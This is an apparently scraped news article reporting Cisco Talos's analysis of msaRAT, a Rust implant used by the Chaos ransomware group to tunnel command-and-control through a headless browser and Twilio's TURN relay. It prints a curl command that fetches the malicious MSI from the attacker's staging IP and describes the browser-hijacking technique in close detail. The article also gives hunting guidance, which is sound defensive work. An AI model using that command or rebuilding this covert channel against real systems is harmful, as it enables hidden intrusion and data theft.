# Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and EdgeJul 23, 2026Ransomware / Network Secur

### 来源信息
- **URL**: https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html
- **来源站点**: The Hacker News
- **页面抓取**: 成功

### 页面正文
The Chaos ransomware group ran its command-and-control through the victim's own browser. Cisco Talos on Thursday detailed msaRAT, the Rust implant behind it, found on a compromised Windows machine ahead of the encryptor.
The implant never opens an outbound connection of its own. Its process talks to 127.0.0.1 and nothing else. It starts Chrome or Edge in headless mode and drives the browser over the Chrome DevTools Protocol, the browser's own debugging API.
Every C2 message travels out from there through a WebRTC data channel relayed by Twilio's TURN service, so what a defender sees on the wire is a browser calling Cloudflare and Twilio. The attacker's own server address never appears at all.
Chrome Does the Talking
msaRAT looks for Chrome or Edge through environment variables first, then falls back to the registry for Chrome. If no matching browser is found, the CDP path is skipped.
When it finds one, it starts the browser without a visible window using --headless=new, enables CDP with --remote-debugging-port, and points it at a separate --user-data-dir.
Since Chrome 136, Google no longer honors the debugging switch against the default profile, a change announced in March 2025 after infostealers took up the flag for cookie theft. msaRAT brings its own profile directory, so the change does not get in its way. Nothing in Talos's analysis shows it touching the victim's profile at all.
The malware asks /json/list/ for a debuggable target and connects to the returned WebSocket URL. It creates a tab, switches off Content Security Policy with Page.setBypassCSP, registers five callbacks through Runtime.addBinding, and calls Runtime.evaluate to inject JavaScript stored in plaintext in the binary's .rdata section.
Four callback names, msaOpen, msaClose, msaError, and msaMessage, gave Talos the malware's name. The fifth is dataAck.
That JavaScript fetches STUN and TURN configuration from a Cloudflare Worker at is-01-ast[.]ols-img-12[.]workers[.]dev, with Origin and Referer headers disguised as traffic from Microsoft's site. It builds a peer connection and posts an SDP offer to the same endpoint.
The answer comes back with no ICE candidates and the connection address set to 0.0.0.0, so no direct peer-to-peer link can form, and the whole channel runs through Twilio's relay at global.turn.twilio.com. Once the data channel is live, the Worker drops out of the path.
Traffic on that channel is encrypted twice. The browser handles DTLS, and inside it sits a ChaCha-Poly1305-based scheme keyed by an ECDH exchange that starts with a 0xFE handshake frame from the C2 immediately after connection.
The implant passes incoming command frames to cmd.exe /e:ON /v:OFF /d /c <cmd> for execution. Talos reads the send queue and flow control as likely built to move large payloads like screenshots or files reliably.
Neither half of the transport is new. Praetorian showed in August 2025 that conferencing platforms' TURN infrastructure could carry a full C2 channel, and Sansec found a skimmer in March 2026 using WebRTC data channels to move stolen card data past HTTP inspection.
msaRAT puts both inside a Chaos-linked Rust implant that drives a headless browser through CDP.
The Way In Is the Same as Ever
msaRAT arrives after the operator already has execution and before the encryptor runs. Talos does not say how this machine was reached. The group's documented playbook is spam floods, vishing, Quick Assist, and RMM tools for persistence.
The implant itself comes down with a single curl command:
curl.exe https://172.86.126[.]18:443/update_ms.msi -o C:\programdata\update_ms.msi
Port 443, plain HTTP. Firewall rules written around port numbers without protocol inspection let it through. The MSI carries property data impersonating a Windows update, and a custom action fires at the end of installation to load an embedded DLL straight into memory.
That DLL is msaRAT: written in Rust on the Tokio async runtime, exporting a function named RUN for the installer to call.
Hunting Notes
msaRAT is post-compromise malware and does not depend on a Chrome or Edge vulnerability, so defenders have no browser patch to apply for the technique itself.
The signal that lasts is process behavior. As Talos puts it, "all external communications are observed as originating from a legitimate browser process." Hunt for Chrome or Edge launched by an installer, a service, or another non-interactive parent with --headless=new and --remote-debugging-port set.
Then correlate that process with loopback traffic to the debugging port and outbound WebRTC. Where telemetry captures CDP messages, Runtime.addBinding and Runtime.evaluate are the pivots. Fleets that run browser automation or CI will have their own headless jobs to tune around.
As of July 23, 2026, Talos has published no file hashes for msaRAT. The public indicator set is two network artifacts, the staging IP and the Worker hostname, both in its IOC repository. Talos's detection coverage:
- ClamAV: Win.Downloader.ChaosRaas-10060321-0
- Snort 2: 1:66839,1:66840,1:66841
- Snort 3: 1:66839,1:301587
Those indicators are useful but narrow. workers.dev is Cloudflare's shared deployment domain, issued to every Workers account, and attackers used it last year to stage payloads and tunnel C2.
Twilio runs a legitimate STUN and TURN service that real WebRTC applications depend on. Block either at the org level and you break working traffic for everyone who uses them. Talos reads that as the likely reason Cloudflare Workers was picked for signaling.
Treat this as observed tradecraft rather than a measured campaign. The report does not identify the victim, establish how many organizations received msaRAT, say when the malware entered use, or explain how the Cloudflare Worker and Twilio TURN credentials were obtained.
The delivery is unremarkable: a curl download, a fake Windows update, a DLL loaded from an MSI. What changes is where the C2 lives afterward, and both indicators Talos published can be swapped out tomorrow. A headless browser spawned by an installer is harder to move, because it is the technique.
msaRAT checks for two browsers and needs one of them present and allowed out. On a Windows fleet, that is not a demanding requirement.

---
*爬取时间: 2026-07-24 15:42:35*
*来源: 直接站点爬取*
